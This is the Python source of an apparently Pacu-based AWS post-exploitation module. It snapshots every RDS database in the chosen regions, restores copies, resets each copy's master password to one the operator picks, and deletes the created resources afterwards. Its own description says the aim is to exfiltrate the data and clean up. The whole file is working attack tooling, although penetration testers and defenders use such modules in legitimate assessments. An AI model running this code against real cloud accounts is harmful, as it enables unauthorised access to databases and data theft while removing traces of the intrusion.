#!/usr/bin/env python3
import argparse

from botocore.exceptions import ClientError

module_info = {
    'name': 'rds_snapshot_explorer',
    'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
    'category': 'post-exploitation',
    'one_liner': 'Snapshot databases, change the master password, exfiltrate data.',
    'description': 'Snapshot all databases, restore new databases from those snapshots, then ModifyDBInstance to change the master password, then maybe mysqldump/psqldump/etc to exfil it, then cleanup all the resources that were created.',
    'services': ['RDS'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--regions'],
}
parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')
def main(args, pacu):
    """Main module function, called from Pacu"""
    args = parser.parse_args(args)
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = pacu.get_regions('rds')

    for region in regions:
        pacu.print('Region: {}'.format(region))
        client = pacu.get_boto3_client('rds', region)
        active_instances = get_all_region_instances(client)
        snapshots = create_snapshots_from_instances(client, active_instances)
        temp_instances = restore_instance_from_snapshots(client, snapshots)
        process_instances(pacu, client, temp_instances)
        delete_instances(client, temp_instances)
        delete_snapshots(client, snapshots)
    return {}

def process_instances(pacu, client, instances):
    for instance in instances:
        waiter = client.get_waiter('db_instance_available')
        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
        password = pacu.input('  Set Master Password for current Instance: ')
        if modify_master_password(client, instance, password):
            pacu.print('  Password Change Successfully')
        else:
            pacu.print('  Password Change Failed')

        pacu.input('Press enter to process next instance...')

def modify_master_password(client, instance, password):
    try:
        client.modify_db_instance(
            DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            MasterUserPassword=password,
        )
        return True
    except ClientError as error:
        print(error)
    return False

def delete_instances(client, instances):
    for instance in instances:
        waiter = client.get_waiter('db_instance_available')
        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
        try:
            client.delete_db_instance(
                DBInstanceIdentifier=instance['DBInstanceIdentifier'],
                SkipFinalSnapshot=True,
            )
        except ClientError as error:
            print(error)
            continue
    #Confirm that all of the instances have been deleted
    for instance in instances:
        waiter = client.get_waiter('db_instance_deleted')
        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])

def restore_instance_from_snapshots(client, snapshots):
    instances = []
    for snapshot in snapshots:
        waiter = client.get_waiter('db_snapshot_available')
        waiter.wait(DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'])
        try:
            response = client.restore_db_instance_from_db_snapshot(
                DBInstanceIdentifier=snapshot['DBSnapshotIdentifier'],
                DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'],
            )
            instances.append(response['DBInstance'])
        except ClientError as error:
            print(error)
    return instances


def delete_snapshots(client, snapshots):
    for snapshot in snapshots:
        waiter = client.get_waiter('db_snapshot_available')
        waiter.wait(DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier'])
        try:
            client.delete_db_snapshot(
                DBSnapshotIdentifier=snapshot['DBSnapshotIdentifier']
            )
        except ClientError as error:
            print(error)

def create_snapshots_from_instances(client, instances):
    snapshots = []
    for instance in instances:
        waiter = client.get_waiter('db_instance_available')
        waiter.wait(DBInstanceIdentifier=instance['DBInstanceIdentifier'])
        try:
            response = client.create_db_snapshot(
                DBSnapshotIdentifier=instance['DBInstanceIdentifier'] + '-copy',
                DBInstanceIdentifier=instance['DBInstanceIdentifier'],
            )
            snapshots.append(response['DBSnapshot'])
        except ClientError as error:
            print(error)
    return snapshots


def get_all_region_instances(client):
    out = []
    paginator = client.get_paginator('describe_db_instances')
    pages = paginator.paginate()
    try:
        for page in pages:
            out.extend(page['DBInstances'])
        return out
    except ClientError as error:
        print(error)
        return []

def summary(data, pacu_main):
    out = ''
    return out
